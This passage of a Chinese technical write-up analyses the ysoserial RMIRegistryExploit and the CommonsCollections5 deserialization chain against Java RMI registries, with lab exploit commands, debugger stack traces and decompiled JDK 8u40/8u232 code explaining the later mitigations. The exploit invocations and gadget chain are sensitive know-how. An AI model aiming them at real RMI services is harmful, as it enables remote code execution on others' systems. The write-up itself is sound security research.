"/bin/touch /tmp/scz_is_here"

客户端抛出异常:

Caused by: java.lang.ClassNotFoundException: GeneralInvocationHandler3 (no security manager: RMI class loader disabled)

在192.168.65.20上:

java_8_232 \
-cp ysoserial-0.0.6-SNAPSHOT-all.jar \
ysoserial.exploit.RMIRegistryExploit 192.168.65.23 1099 CommonsCollections5 \
"/bin/touch /tmp/scz_is_here"

客户端抛出异常:

Caused by: java.rmi.AccessException: Registry.Registry.bind disallowed; origin /192.168.65.20 is non-local host

虽然两次客户端命令都得到异常，但每次都得手了。第一次客户端命令使用的
InvocationHandler是服务端找不到的GeneralInvocationHandler3，服务端流程不会
到达RegistryImpl.checkAccess()。第二次客户端命令使用的InvocationHandler是
AnnotationInvocationHandler，服务端能找到，服务端流程会到达
RegistryImpl.checkAccess()。后面第10小节会细讲，这里用断点简单确认一下:

java_8_40 -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-Djava.rmi.server.hostname=192.168.65.20 \
-cp "commons-collections-3.1.jar:." \
RMIRegistryServer 1099

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in sun.rmi.registry.RegistryImpl.checkAccess

  [1] sun.rmi.registry.RegistryImpl.checkAccess (RegistryImpl.java:244), pc = 0
  [2] sun.rmi.registry.RegistryImpl.bind (RegistryImpl.java:179), pc = 2
  [3] sun.rmi.registry.RegistryImpl_Skel.dispatch (null), pc = 153
  [4] sun.rmi.server.UnicastServerRef.oldDispatch (UnicastServerRef.java:410), pc = 100
  [5] sun.rmi.server.UnicastServerRef.dispatch (UnicastServerRef.java:268), pc = 31
  [6] sun.rmi.transport.Transport$1.run (Transport.java:200), pc = 23
  [7] sun.rmi.transport.Transport$1.run (Transport.java:197), pc = 1
  [8] java.security.AccessController.doPrivileged (native method)
  [9] sun.rmi.transport.Transport.serviceCall (Transport.java:196), pc = 157
  [10] sun.rmi.transport.tcp.TCPTransport.handleMessages (TCPTransport.java:568), pc = 185
  [11] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0 (TCPTransport.java:826), pc = 685
  [12] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$78 (TCPTransport.java:683), pc = 1
  [13] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1.1433130086.run (null), pc = 4
  [14] java.security.AccessController.doPrivileged (native method)
  [15] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run (TCPTransport.java:682), pc = 58
  [16] java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1,142), pc = 95
  [17] java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:617), pc = 5
  [18] java.lang.Thread.run (Thread.java:745), pc = 11

8) 简化版调用关系(重点看这个)

强调一下，这主要是8u40的调用关系，夹杂了一些8u232的变化。

--------------------------------------------------------------------------
TCPTransport.handleMessages                                 // 8u40
  Transport.serviceCall
    UnicastServerRef.dispatch
      UnicastServerRef.oldDispatch
        RegistryImpl_Skel.dispatch                          // UnicastServerRef:410
          RegistryImpl.checkAccess                          // 位于RegistryImpl_Skel.class中
                                                            // 8u232在此增加的调用，8u40无此调用
                                                            // 即使8u232没有其他安全增强，远程"ysoserial/RMIRegistryExploit"也因此而废
          ObjectInputStream.readObject                      // 位于RegistryImpl_Skel.class中
            ObjectInputStream.readOrdinaryObject:1774
                ObjectInputStream.readClassDesc
                  ObjectInputStream.readNonProxyDesc
                    MarshalInputStream.resolveClass
                      RMIClassLoader.loadClass
                        LoaderHandler.loadClass             // LoaderHandler:361
                          Class.forName                     // LoaderHandler:378
                                                            // 尝试加载GeneralInvocationHandler3
                                                            // 没找到，抛异常，该异常最终会发往客户端
            ObjectInputStream.readOrdinaryObject:1795       // 处理没找到GeneralInvocationHandler3的异常
                                                            // 流程不会在此中止
            ObjectInputStream.readOrdinaryObject:1801
              ObjectInputStream.readSerialData
                ObjectInputStream.defaultReadFields         // 8u232在此增加的调用，8u40无此调用
                  ObjectInputStream.readOrdinaryObject
                    ObjectInputStream.readClassDesc
                      ObjectInputStream.readNonProxyDesc
                        ObjectInputStream.filterCheck
                          RegistryImpl.registryFilter       // 查看8u232的这个函数，有一张白名单
                                                            // 失败时返回"ObjectInputFilter.Status.REJECTED"
                BadAttributeValueExpException.readObject    // ObjectInputStream:1896
                                                            // ysoserial/CommonsCollections5
                                                            // 对应客户端的bave变量
                  TiedMapEntry.toString                     // TiedMapEntry.hashCode()、TiedMapEntry.toString
                                                            // 都会调用TiedMapEntry.getValue()
                    TiedMapEntry.getValue
                      LazyMap.get                           // 此处开始LazyMap利用链
                        ChainedTransformer.transform
                          InvokerTransformer.transform
                            Runtime.exec                    // 执行恶意代码
          RegistryImpl.rebind                               // 位于RegistryImpl_Skel.class中
            RegistryImpl.checkAccess                        // 检查rebind()的源IP与目标IP是否位于同一主机，不是则抛出异常
                                                            // 8u232的rebind()不再调用checkAccess()
        StreamRemoteCall.getResultStream                    // UnicastServerRef:415
        ServerException.<init>                              // UnicastServerRef:420
                                                            // 封装服务端捕获的异常，准备发往客户端
        ObjectOutputStream.writeObject                      // UnicastServerRef:427
                                                            // 向客户端发送"没找到GeneralInvocationHandler3的异常"
--------------------------------------------------------------------------

GeneralInvocationHandler3不像AnnotationInvocationHandler，前者没有实现
readObject()，于是ObjectInputStream.readObject()不会调用想像中
的GeneralInvocationHandler3.readObject()。在反序列化过程尝试寻找
GeneralInvocationHandler3未果，内层函数抛出异常，但外层捕获这种异常，并有
相应处理使这种异常可以发往客户端。找不到GeneralInvocationHandler3？无所谓，
流程继续，仍将触发恶意代码。GeneralInvocationHandler3存在的意义仅仅是让客
户端可以生成remoteProxy，服务端的中招流程不需要它。

再次说明，别瞎YY，如果怀疑别人([57])的说法，就去验证之。要是不验证就喷，丢
大发人了。

之前我还YY过，是不是先触发恶意代码再尝试寻找GeneralInvocationHandler3？一
般来说抛异常时流程就中止了。曾经把这个YY想法记了一笔，但在写简化版调用关系
时得严谨，用Eclipse的条件断点看调用栈，用BC对比exec()的调用栈，就发现分岔
点在"readOrdinaryObject:1774"，发现之前的YY是错的。写文档是一个再提升的过
程，对自己要求严一些没坏处。

调试EvilRMIRegistryClientWithBadAttributeValueExpException3，确认恶意代码
不是在客户端执行的:

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-cp "commons-collections-3.1.jar:." \
EvilRMIRegistryClientWithBadAttributeValueExpException3 192.168.65.23 1099 \
"/bin/touch /tmp/scz_is_here"

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

stop in java.lang.Runtime.exec(java.lang.String[])

无命中，放心了。

9) ysoserial/RMIRegistryExploit

参[52]

https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/RMIRegistryExploit.java

java_8_40 \
-Djava.rmi.server.hostname=192.168.65.23 \
-cp "commons-collections-3.1.jar:." \
RMIRegistryServer 1099

java \
-cp ysoserial-0.0.6-SNAPSHOT-all.jar \
ysoserial.exploit.RMIRegistryExploit 192.168.65.23 1099 CommonsCollections5 \
"/bin/touch /tmp/scz_is_here"

回顾整个攻击链，服务端看到的是remoteProxy，对之反序列化，只要有个什么东西
跟remoteProxy有关联，就会一块反序列化。InvocationHandler天然与remoteProxy
有关联，从而只要有个什么东西与InvocationHandler有关联，就会一块反序列化。

如果不仔细，看RMIRegistryExploit.java的代码有可能引起误会，main()中有一句:

String className = CommonsCollections1.class.getPackage().getName() + "." + args[2];

有人说RMIRegistryExploit用的是CommonsCollections1，再仔细看，是这么回事吗？
这句代码实际相当于:

String className = "ysoserial.payloads" + "." + args[2];

10) sun.rmi.registry.RegistryImpl.checkAccess

参看:

《Java RMI入门》
http://scz.617.cn/network/202002221000.txt

周知端口与动态端口不在同一台主机上时，正常的远程rebind()就会失败。后面实验
所涉及的class全部源自上述URL，不在本篇重复提供。

在192.168.65.23上:

$ ls -l
HelloRMIWellknownServer.class
HelloRMIInterface.class
HelloRMIServerSocketFactoryImpl.class

$ java_8_40 HelloRMIWellknownServer 192.168.65.23 1099 192.168.65.20

在192.168.65.20上:

$ ls -1
HelloRMIDynamicServer.class
HelloRMIInterface.class
HelloRMIInterfaceImpl3.class
HelloRMIServerSocketFactoryImpl.class

$ java_8_232 HelloRMIDynamicServer 192.168.65.23 1099 192.168.65.20 0 anything
Exception in thread "main" java.rmi.ServerException: RemoteException occurred in server thread; nested exception is:
        java.rmi.AccessException: Registry.Registry.rebind disallowed; origin /192.168.65.20 is non-local host
        at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:420)
        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:268)
        at sun.rmi.transport.Transport$1.run(Transport.java:200)
        at sun.rmi.transport.Transport$1.run(Transport.java:197)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:568)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:826)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$78(TCPTransport.java:683)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1/840376522.run(Unknown Source)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:682)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
        at java.lang.Thread.run(Thread.java:745)
        at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:303)
        at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:279)
        at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:375)
        at sun.rmi.registry.RegistryImpl_Stub.rebind(RegistryImpl_Stub.java:158)
        at HelloRMIDynamicServer.main(HelloRMIDynamicServer.java:27)
Caused by: java.rmi.AccessException: Registry.Registry.rebind disallowed; origin /192.168.65.20 is non-local host
        at sun.rmi.registry.RegistryImpl.checkAccess(RegistryImpl.java:287)
        at sun.rmi.registry.RegistryImpl.rebind(RegistryImpl.java:212)
        at sun.rmi.registry.RegistryImpl_Skel.dispatch(Unknown Source)
        at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:410)
        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:268)
        at sun.rmi.transport.Transport$1.run(Transport.java:200)
        at sun.rmi.transport.Transport$1.run(Transport.java:197)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:568)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:826)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$78(TCPTransport.java:683)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$1/840376522.run(Unknown Source)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:682)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
        at java.lang.Thread.run(Thread.java:745)

checkAccess()会检查rebind()的源IP与目标IP是否位于同一主机，不是则抛出异常
java.rmi.AccessException，换句话说，远程rebind()不会成功。TCP层没有限制，
检查是Java RMI自己加的。在盯上"ysoserial/RMIRegistryExploit"之前就知道这事，
还跟KINGX专门提过，但等我去看RMIRegistryExploit.java时，赫然发现它在远程
rebind()。然后我开始YY，是不是老版没有checkAccess()？但8u40有这个函数。然
后我提出一个设想，可能checkAccess()已经很靠后了，恶意代码在它之前得到执行。
为了做实验，只好去学了一番"Commons Collections反序列化漏洞"，这就是:

《Java RMI入门(5)》
http://scz.617.cn/network/202003241127.txt

后面有关于checkAccess()的更多分析，将看到8u232与8u40的不同之处。

11) sun.rmi.registry.RegistryImpl_Skel.dispatch

参看:

http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u40-b26/src/share/classes/sun/rmi/registry/RegistryImpl.java

http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/registry/RegistryImpl.java
http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/registry/RegistryImpl_Skel.java

居然没找到8u40的RegistryImpl_Skel.java，先看8u232的吧。

```java
/*
 * 8u232
 *
 * sun.rmi.registry.RegistryImpl_Skel
 *
 * 40行
 */
private static final java.rmi.server.Operation[] operations = {
        new java.rmi.server.Operation("void bind(java.lang.String, java.rmi.Remote)"),
        new java.rmi.server.Operation("java.lang.String list()[]"),
        new java.rmi.server.Operation("java.rmi.Remote lookup(java.lang.String)"),
        new java.rmi.server.Operation("void rebind(java.lang.String, java.rmi.Remote)"),
        new java.rmi.server.Operation("void unbind(java.lang.String)")
};

/*
 * 48行，参看:
 *
 * 《Java RMI入门》
 * http://scz.617.cn/network/202002221000.txt
 *
 * 10.2.1) HelloRMI_6.cap部分报文解码
 *
 * 就是那个哈希0x44154dc9d4e63bdf
 */
private static final long interfaceHash = 4905912898345647071L;

/*
 * 54行
 */
public void dispatch(java.rmi.Remote obj, java.rmi.server.RemoteCall remoteCall, int opnum, long hash)
        throws java.lang.Exception {
    if (opnum < 0) {
        if (hash == 7583982177005850366L) {
            opnum = 0;
        } else if (hash == 2571371476350237748L) {
            opnum = 1;
        } else if (hash == -7538657168040752697L) {
            opnum = 2;
        } else if (hash == -8381844669958460146L) {
            opnum = 3;
        } else if (hash == 7305022919901907578L) {
            opnum = 4;
        } else {
            throw new java.rmi.UnmarshalException("invalid method hash");
        }
    } else {
        if (hash != interfaceHash)
            throw new java.rmi.server.SkeletonMismatchException("interface hash mismatch");
    }

    sun.rmi.registry.RegistryImpl server = (sun.rmi.registry.RegistryImpl) obj;
    StreamRemoteCall call = (StreamRemoteCall) remoteCall;
    switch (opnum) {
        case 0: // bind(String, Remote)
        {
            /*
             * 81行，8u232相比8u40有一个很大的安全增强，前者把
             * RegistryImpl.checkAccess()挪到ObjectInputStream.readObject()
             * 之前了，这使得远程bind()、rebind()彻底不可行，远程
             * "ysoserial/RMIRegistryExploit"就这么废了。
             */
            // Check access before reading the arguments
            RegistryImpl.checkAccess("Registry.bind");

            java.lang.String $param_String_1;
            java.rmi.Remote $param_Remote_2;
            try {
                java.io.ObjectInput in = call.getInputStream();
                $param_String_1 = (java.lang.String) in.readObject();
                $param_Remote_2 = (java.rmi.Remote) in.readObject();
            } catch (ClassCastException | IOException | ClassNotFoundException e) {
                call.discardPendingRefs();
                throw new java.rmi.UnmarshalException("error unmarshalling arguments", e);
            } finally {
                call.releaseInputStream();
            }
            server.bind($param_String_1, $param_Remote_2);
            try {
                call.getResultStream(true);
            } catch (java.io.IOException e) {
                throw new java.rmi.MarshalException("error marshalling return", e);
            }
            break;
        }

        case 1: // list()
        {
            call.releaseInputStream();
            java.lang.String[] $result = server.list();
            try {
                java.io.ObjectOutput out = call.getResultStream(true);
                out.writeObject($result);
            } catch (java.io.IOException e) {
                throw new java.rmi.MarshalException("error marshalling return", e);
            }
            break;
        }

        case 2: // lookup(String)
        {
            java.lang.String $param_String_1;
            try {
                java.io.ObjectInput in = call.getInputStream();
                $param_String_1 = (java.lang.String) in.readObject();
            } catch (ClassCastException | IOException | ClassNotFoundException e) {
                call.discardPendingRefs();
                throw new java.rmi.UnmarshalException("error unmarshalling arguments", e);
            } finally {
                call.releaseInputStream();
            }
            java.rmi.Remote $result = server.lookup($param_String_1);
            try {
                java.io.ObjectOutput out = call.getResultStream(true);
                out.writeObject($result);
            } catch (java.io.IOException e) {
                throw new java.rmi.MarshalException("error marshalling return", e);
            }
            break;
        }

        case 3: // rebind(String, Remote)
        {
            /*
             * 142行，8u232把RegistryImpl.checkAccess()挪到
             * ObjectInputStream.readObject()之前
             */
            // Check access before reading the arguments
            RegistryImpl.checkAccess("Registry.rebind");

            java.lang.String $param_String_1;
            java.rmi.Remote $param_Remote_2;
            try {
                java.io.ObjectInput in = call.getInputStream();
                $param_String_1 = (java.lang.String) in.readObject();
                /*
                 * 149行，反序列化Remote对象
                 */
                $param_Remote_2 = (java.rmi.Remote) in.readObject();
            } catch (ClassCastException | IOException | java.lang.ClassNotFoundException e) {
                call.discardPendingRefs();
                throw new java.rmi.UnmarshalException("error unmarshalling arguments", e);
            } finally {
                call.releaseInputStream();
            }
            server.rebind($param_String_1, $param_Remote_2);
            try {
                call.getResultStream(true);
            } catch (java.io.IOException e) {
                throw new java.rmi.MarshalException("error marshalling return", e);
            }
            break;
        }

        case 4: // unbind(String)
        {
            // Check access before reading the arguments
            RegistryImpl.checkAccess("Registry.unbind");

            java.lang.String $param_String_1;
            try {
                java.io.ObjectInput in = call.getInputStream();
                $param_String_1 = (java.lang.String) in.readObject();
            } catch (ClassCastException | IOException | ClassNotFoundException e) {
                call.discardPendingRefs();
                throw new java.rmi.UnmarshalException("error unmarshalling arguments", e);
            } finally {
                call.releaseInputStream();
            }
            server.unbind($param_String_1);
            try {
                call.getResultStream(true);
            } catch (java.io.IOException e) {
                throw new java.rmi.MarshalException("error marshalling return", e);
            }
            break;
        }

        default:
            throw new java.rmi.UnmarshalException("invalid method number");
    }
}
```

8u232相比8u40有一个很大的安全增强，前者把RegistryImpl.checkAccess()挪到
ObjectInputStream.readObject()之前了，这使得远程bind()、rebind()彻底不可行，
远程"ysoserial/RMIRegistryExploit"就这么废了。

```java
/*
 * 用JD-GUI看8u40的rt.jar
 *
 * sun.rmi.registry.RegistryImpl_Skel
 */
public void dispatch(Remote paramRemote, RemoteCall paramRemoteCall, int paramInt, long paramLong)
  throws Exception
{
  if (paramLong != 4905912898345647071L) {
    throw new SkeletonMismatchException("interface hash mismatch");
  }
  RegistryImpl localRegistryImpl = (RegistryImpl)paramRemote;
  Object localObject1;
  Object localObject2;
  Remote localRemote;
  switch (paramInt)
  {
  case 0:
    try
    {
      ObjectInput localObjectInput3 = paramRemoteCall.getInputStream();
/*
 * bind(String name, Remote obj)
 *
 * 先反序列化两个形参name、obj
 */
      localObject1 = (String)localObjectInput3.readObject();
      localObject2 = (Remote)localObjectInput3.readObject();
    }
    catch (IOException localIOException8)
    {
      throw new UnmarshalException("error unmarshalling arguments", localIOException8);
    }
    catch (ClassNotFoundException localClassNotFoundException3)
    {
      throw new UnmarshalException("error unmarshalling arguments", localClassNotFoundException3);
    }
    finally
    {
      paramRemoteCall.releaseInputStream();
    }
/*
 * RegistryImpl.bind()中调用checkAccess("Registry.bind")
 */
    localRegistryImpl.bind((String)localObject1, (Remote)localObject2);
    try
    {
      paramRemoteCall.getResultStream(true);
    }
    catch (IOException localIOException3)
    {
      throw new MarshalException("error marshalling return", localIOException3);
    }
  case 1:
...
  case 2:
...
  case 3:
    try
    {
      ObjectInput localObjectInput4 = paramRemoteCall.getInputStream();
/*
 * rebind(String name, Remote obj)
 *
 * 先反序列化两个形参name、obj
 */
      localObject1 = (String)localObjectInput4.readObject();
      localRemote = (Remote)localObjectInput4.readObject();
    }
    catch (IOException localIOException9)
    {
      throw new UnmarshalException("error unmarshalling arguments", localIOException9);
    }
    catch (ClassNotFoundException localClassNotFoundException4)
    {
      throw new UnmarshalException("error unmarshalling arguments", localClassNotFoundException4);
    }
    finally
    {
      paramRemoteCall.releaseInputStream();
    }
/*
 * RegistryImpl.rebind()中调用checkAccess("Registry.rebind")
 */
    localRegistryImpl.rebind((String)localObject1, localRemote);
    try
    {
      paramRemoteCall.getResultStream(true);
    }
    catch (IOException localIOException5)
    {
      throw new MarshalException("error marshalling return", localIOException5);
    }
  case 4:
...
  default:
    throw new UnmarshalException("invalid method number");
  }
}
```

相比8u40，8u232的RegistryImpl.bind()、RegistryImpl.rebind()不再调用
RegistryImpl.checkAccess()。

前面这些分析只是满足个人好奇心，不看也罢。要点已合并到"8) 简化版调用关系"
中，可以提纲挈领式地看到全貌。

12) 8u232为什么失败

假设目录结构是:
.
|
+---test2
|       RMIRegistryServer.class
|       commons-collections-3.1.jar
|
\---test3
        EvilRMIRegistryClientWithBadAttributeValueExpException3.class
        GeneralInvocationHandler3.class
        commons-collections-3.1.jar

在test2目录执行:

java \
-Djava.rmi.server.hostname=192.168.65.23 \
-cp "commons-collections-3.1.jar:." \
RMIRegistryServer 1099

这次用8u232启动RMIRegistryServer。

在test3目录执行:

java \
-cp "commons-collections-3.1.jar:." \
EvilRMIRegistryClientWithBadAttributeValueExpException3 192.168.65.23 1099 \
"/bin/touch /tmp/scz_is_here"

服务端、客户端在同一主机，可以通过RegistryImpl.checkAccess()检查。

客户端抛异常:

Exception in thread "main" java.rmi.ServerException: RemoteException occurred in server thread; nested exception is:
        java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:
        java.io.InvalidClassException: filter status: REJECTED
        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:389)
        at sun.rmi.transport.Transport$1.run(Transport.java:200)
        at sun.rmi.transport.Transport$1.run(Transport.java:197)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:573)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:834)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:688)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:687)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
        at java.lang.Thread.run(Thread.java:748)
        at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:303)
        at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:279)
        at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:375)
        at sun.rmi.registry.RegistryImpl_Stub.rebind(RegistryImpl_Stub.java:158)
        at EvilRMIRegistryClientWithBadAttributeValueExpException3.main(EvilRMIRegistryClientWithBadAttributeValueExpException3.java:109)
Caused by: java.rmi.UnmarshalException: error unmarshalling arguments; nested exception is:
        java.io.InvalidClassException: filter status: REJECTED
        at sun.rmi.registry.RegistryImpl_Skel.dispatch(RegistryImpl_Skel.java:152)
        at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:469)
        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:301)
        at sun.rmi.transport.Transport$1.run(Transport.java:200)
        at sun.rmi.transport.Transport$1.run(Transport.java:197)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.Transport.serviceCall(Transport.java:196)
        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:573)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:834)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:688)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:687)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
        at java.lang.Thread.run(Thread.java:748)
Caused by: java.io.InvalidClassException: filter status: REJECTED
        at java.io.ObjectInputStream.filterCheck(ObjectInputStream.java:1254)
        at java.io.ObjectInputStream.readNonProxyDesc(ObjectInputStream.java:1877)
        at java.io.ObjectInputStream.readClassDesc(ObjectInputStream.java:1750)
        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2041)
        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1572)
        at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:2286)
        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2166)
        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2068)
        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1572)
        at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:2286)
        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2210)
        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2068)
        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1572)
        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:430)
        at sun.rmi.registry.RegistryImpl_Skel.dispatch(RegistryImpl_Skel.java:149)
        ... 14 more

调试RMIRegistryServer:

java -agentlib:jdwp=transport=dt_socket,address=192.168.65.23:8005,server=y,suspend=y \
-Djava.rmi.server.hostname=192.168.65.23 \
-cp "commons-collections-3.1.jar:." \
RMIRegistryServer 1099

jdb -connect com.sun.jdi.SocketAttach:hostname=192.168.65.23,port=8005

catch java.io.InvalidClassException

  [1] java.io.ObjectInputStream.filterCheck (ObjectInputStream.java:1,256), pc = 197
  [2] java.io.ObjectInputStream.readNonProxyDesc (ObjectInputStream.java:1,877), pc = 154
  [3] java.io.ObjectInputStream.readClassDesc (ObjectInputStream.java:1,750), pc = 86
  [4] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,041), pc = 22
  [5] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
  [6] java.io.ObjectInputStream.defaultReadFields (ObjectInputStream.java:2,286), pc = 150
  [7] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,166), pc = 56
  [8] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,068), pc = 183
  [9] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
  [10] java.io.ObjectInputStream.defaultReadFields (ObjectInputStream.java:2,286), pc = 150
  [11] java.io.ObjectInputStream.readSerialData (ObjectInputStream.java:2,210), pc = 298
  [12] java.io.ObjectInputStream.readOrdinaryObject (ObjectInputStream.java:2,068), pc = 183
  [13] java.io.ObjectInputStream.readObject0 (ObjectInputStream.java:1,572), pc = 401
  [14] java.io.ObjectInputStream.readObject (ObjectInputStream.java:430), pc = 19
  [15] sun.rmi.registry.RegistryImpl_Skel.dispatch (RegistryImpl_Skel.java:149), pc = 429
  [16] sun.rmi.server.UnicastServerRef.oldDispatch (UnicastServerRef.java:469), pc = 137
  [17] sun.rmi.server.UnicastServerRef.dispatch (UnicastServerRef.java:301), pc = 44
  [18] sun.rmi.transport.Transport$1.run (Transport.java:200), pc = 23
  [19] sun.rmi.transport.Transport$1.run (Transport.java:197), pc = 1
  [20] java.security.AccessController.doPrivileged (native method)
  [21] sun.rmi.transport.Transport.serviceCall (Transport.java:196), pc = 157
  [22] sun.rmi.transport.tcp.TCPTransport.handleMessages (TCPTransport.java:573), pc = 185
  [23] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0 (TCPTransport.java:834), pc = 696
  [24] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0 (TCPTransport.java:688), pc = 1
  [25] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$5.1362723662.run (null), pc = 4
  [26] java.security.AccessController.doPrivileged (native method)
  [27] sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run (TCPTransport.java:687), pc = 58
  [28] java.util.concurrent.ThreadPoolExecutor.runWorker (ThreadPoolExecutor.java:1,149), pc = 95
  [29] java.util.concurrent.ThreadPoolExecutor$Worker.run (ThreadPoolExecutor.java:624), pc = 5
  [30] java.lang.Thread.run (Thread.java:748), pc = 11

参看:

http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/java/io/ObjectInputStream.java
http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u232-ga/src/share/classes/sun/rmi/registry/RegistryImpl.java

ObjectInputStream.filterCheck()会调用RegistryImpl.registryFilter()，后者有
一张白名单，若类不在白名单中，后者返回"ObjectInputFilter.Status.REJECTED"，
前者主动抛出"InvalidClassException"，此时尚未调用目标类的readObject()。要
点已合并到"8) 简化版调用关系"中，可以提纲挈领式地看到全貌。

从简化版调用关系可以看到，虽然8u232的RegistryImpl.registryFilter()有张白名
单，但在现实世界中，更可能先触发RegistryImpl.checkAccess()。一般调试PoC时
服务端、客户端在同一台主机上，会无意中忽视RegistryImpl.checkAccess()的存在。

12.1) sun.rmi.registry.RegistryImpl.registryFilter

RegistryImpl.registryFilter()是从8u121-b04开始增加的安全检查，参看:

http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u121-b04/src/share/classes/sun/rmi/registry/RegistryImpl.java
http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/jdk8u121-b04/src/share/classes/sun/misc/ObjectInputFilter.java

```java
/**
 * ObjectInputFilter to filter Registry input objects.
 * The list of acceptable classes is limited to classes normally
 * stored in a registry.
 *
 * @param filterInfo access to the class, array length, etc.
 * @return  {@link ObjectInputFilter.Status#ALLOWED} if allowed,
 *          {@link ObjectInputFilter.Status#REJECTED} if rejected,
 *          otherwise {@link ObjectInputFilter.Status#UNDECIDED}
 */
private static ObjectInputFilter.Status registryFilter(ObjectInputFilter.FilterInfo filterInfo) {
    if (registryFilter != null) {
